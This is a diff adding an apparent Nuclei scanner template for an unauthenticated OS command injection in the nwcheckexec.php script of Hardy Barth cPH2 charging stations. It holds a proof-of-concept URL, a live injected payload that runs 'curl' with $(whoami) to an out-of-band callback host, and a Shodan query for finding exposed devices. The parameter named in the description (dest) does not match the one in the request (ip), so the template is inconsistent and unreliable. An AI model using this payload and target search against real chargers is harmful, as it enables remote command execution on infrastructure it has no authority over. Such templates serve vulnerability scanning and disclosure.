@@ -1,0 +1,41 @@
+id: cph2-nwcheckexec-php-os-command-injection
+
+info:
+  name: cPH2 充电站 nwcheckexec.php 操作系统命令注入漏洞
+  author: mlec
+  severity: critical
+  description: |
+    Hardy Barth cPH2 充电站的 nwcheckexec.php 脚本存在操作系统命令注入漏洞。该漏洞源于 connectivity check 功能对用户传入参数缺乏充分过滤，未认证的远程攻击者可通过向 /nwcheckexec.php 传递特制参数（如 type=ping&dest=8.8.8.8;id）在目标系统上执行任意命令。
+    POC: /nwcheckexec.php?type=ping&dest=8.8.8.8;id
+  reference:
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/Salia/Salia%20PLCC%20cPH2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cvss-metrics: CVSS:3.1/AV:A/AC:N/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.6
+    cwe-id: CWE-78
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"Salia PLCC"
+  tags: cPH2-Charging-Station
+  remediation: >-
+    避免使用用户可控输入拼接 Shell 命令。应使用参数固定的安全进程调用接口，按照允许列表校验输入，落实最小权限原则，并升级到厂商已修复的版本。
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/nwcheckexec.php?ip={{url_encode(''127.0.0.1 && curl http://$(whoami).{{interactsh-url}}'')}}'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - <b>SUCCESS</b>
+          - 127.0.0.1 && curl http://$(whoami).{{interactsh-url}}
+        condition: and
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
